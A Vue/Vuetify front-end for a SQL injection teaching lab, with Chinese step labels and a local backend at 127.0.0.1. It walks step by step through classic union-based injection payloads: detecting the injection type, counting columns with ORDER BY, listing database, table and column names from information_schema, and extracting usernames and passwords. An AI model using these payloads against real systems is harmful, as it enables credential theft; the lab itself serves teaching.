<template>
  <v-app>
    <v-main>
      <template>
        <v-stepper v-model="e1">
          <v-stepper-header>
            <v-stepper-step
                :complete="e1 > 1"
                step="1"
            >
              判断注入点类型
            </v-stepper-step>

            <v-divider></v-divider>

            <v-stepper-step
                :complete="e1 > 2"
                step="2"
            >
              推断列数
            </v-stepper-step>

            <v-divider></v-divider>

            <v-stepper-step
                :complete="e1 > 3"
                step="3">
              获取数据库名与用户名
            </v-stepper-step>

            <v-divider></v-divider>

            <v-stepper-step
                :complete="e1 > 4"
                step="4">
              获取数据库表名
            </v-stepper-step>

            <v-divider></v-divider>

            <v-stepper-step
                :complete="e1 > 5"
                step="5">
              获取数据库表中所有字段名
            </v-stepper-step>

            <v-divider></v-divider>

            <v-stepper-step step="6">
              获取PASSWORD
            </v-stepper-step>
          </v-stepper-header>

          <v-stepper-items>
            <v-stepper-content step="1">
              <v-card
                  class="mb-12"
                  color="grey lighten-1"
                  height="200px"
              >
                <v-card-title>
                  分别输入1' and '1'='1和1' and '1'='2，观察两个返回结果是否相同，如果相同，则为字符型，如果不同，则为整型。
                </v-card-title>
                <v-container fluid>
                  <v-radio-group
                      v-model="userid"
                      column
                  >
                    <v-radio
                        label="userid = 1' and '1'='1"
                        value="1' and '1'='1"
                        @click="submit"
                    ></v-radio>
                    <v-radio
                        label="userid = 1' and '1'='2"
                        value="1' and '1'='2"
                        @click="submit"
                    ></v-radio>
                  </v-radio-group>
                </v-container>
              </v-card>

              <v-btn
                  color="primary"
                  @click="e1 = 2"
              >
                Continue
              </v-btn>
            </v-stepper-content>

            <v-stepper-content step="2">
              <v-card
                  class="mb-12"
                  color="grey lighten-1"
                  height="200px"
              >
                <v-card-title>
                  使用order by推断字段数
                </v-card-title>
                <v-container fluid>
                  <v-radio-group
                      v-model="userid"
                      column
                  >
                    <v-radio
                        label="userid = 1 order by 5%23"
                        value="1 order by 5%23"
                        @click="submit"
                    ></v-radio>
                    <v-radio
                        label="userid = 1 order by 3%23"
                        value="1 order by 3%23"
                        @click="submit"
                    ></v-radio>
                    <v-radio
                        label="userid = 1 order by 2%23"
                        value="1 order by 2%23"
                        @click="submit"
                    ></v-radio>
                  </v-radio-group>
                </v-container>
              </v-card>

              <v-btn
                  color="primary"
                  @click="e1 = 3"
              >
                Continue
              </v-btn>

            </v-stepper-content>

            <v-stepper-content step="3">
              <v-card
                  class="mb-12"
                  color="grey lighten-1"
                  height="200px"
              >
                <v-card-title>
                  使用union联合注入获取数据库名和用户名
                </v-card-title>
                <v-container fluid>
                  <v-radio-group
                      v-model="userid"
                      column
                  >
                    <v-radio
                        label="userid = 1 union select user(),database() #"
                        value="1 union select user(),database() #"
                        @click="submit"
                    ></v-radio>
                  </v-radio-group>
                </v-container>
              </v-card>

              <v-btn
                  color="primary"
                  @click="e1 = 4"
              >
                Continue
              </v-btn>

            </v-stepper-content>

            <v-stepper-content step="4">
              <v-card
                  class="mb-12"
                  color="grey lighten-1"
                  height="200px"
              >
                <v-card-title>
                  使用union联合注入获取表名
                </v-card-title>
                <v-container fluid>
                  <v-radio-group
                      v-model="userid"
                      column
                  >
                    <v-radio
                        label="userid = 1 union select group_concat(table_name),database() from information_schema.tables where table_schema = database() #"
                        value="1 union select group_concat(table_name),database() from information_schema.tables where table_schema = database() #"
                        @click="submit"
                    ></v-radio>
                  </v-radio-group>
                </v-container>
              </v-card>

              <v-btn
                  color="primary"
                  @click="e1 = 5"
              >
                Continue
              </v-btn>

            </v-stepper-content>

            <v-stepper-content step="5">
              <v-card
                  class="mb-12"
                  color="grey lighten-1"
                  height="200px"
              >
                <v-card-title>
                  使用union联合注入获取所有字段名
                </v-card-title>
                <v-container fluid>
                  <v-radio-group
                      v-model="userid"
                      column
                  >
                    <v-radio
                        label="userid = 1 union select group_concat(column_name),database() from information_schema.columns where table_schema = database() #"
                        value="1 union select group_concat(column_name),database() from information_schema.columns where table_schema = database() #"
                        @click="submit"
                    ></v-radio>
                  </v-radio-group>
                </v-container>
              </v-card>

              <v-btn
                  color="primary"
                  @click="e1 = 6"
              >
                Continue
              </v-btn>

            </v-stepper-content>

            <v-stepper-content step="6">
              <v-card
                  class="mb-12"
                  color="grey lighten-1"
                  height="200px"
              >
                <v-card-title>
                  使用union联合注入获取密码
                </v-card-title>
                <v-container fluid>
                  <v-radio-group
                      v-model="userid"
                      column
                  >
                    <v-radio
                        label="userid = 1 union select username, password from users #"
                        value="1 union select username, password from users #"
                        @click="submit"
                    ></v-radio>
                  </v-radio-group>
                </v-container>
              </v-card>

              <v-btn
                  color="primary"
                  @click="e1 = 1"
              >
                Continue
              </v-btn>

            </v-stepper-content>
          </v-stepper-items>
        </v-stepper>
        <v-card :loading="loading" class="mx-auto my-12" max-width="800">
          <v-card-title>输入Userid查询用户名</v-card-title>
          <v-row>
            <v-col
                cols="12"
                md="6"
                offset-md="2"
            >
              <v-text-field
                  v-model="userid"
                  label="Userid"
                  outlined
                  clearable
              ></v-text-field>
            </v-col>
            <v-col cols="12" md="4">
              <v-btn
                  color="primary"
                  outlined
                  @click="submit()"
                  class="ma-2"
              >
                Submit
              </v-btn>
            </v-col>

          </v-row>


          <v-divider></v-divider>
          <v-card-title>返回结果</v-card-title>
          <v-col
              cols="12"
              md="6"
              offset-md="3"
          >
            <v-textarea
                no-resize
                outlined
                name="input-7-4"
                v-model="data"
                disabled
            ></v-textarea>
          </v-col>

        </v-card>
      </template>
    </v-main>
  </v-app>
</template>

<script>
import axios from "axios";

export default {
  name: 'App',

  data: () => ({
    e1: 1,
    userid: "",
    axios,
    loading: false,
    data: "",
  }),
  methods: {
    async submit() {
      var url = "http://127.0.0.1:3000/users/info?userid=" + this.userid
      this.loading = true
      this.axios.get(url).then((res) => {
        console.log(res.data)
        this.data = JSON.stringify(res.data)
      }).catch((err) => {
        console.log(err)
        this.data = "error!"
      })
      this.loading = false
    }
  }
};
</script>
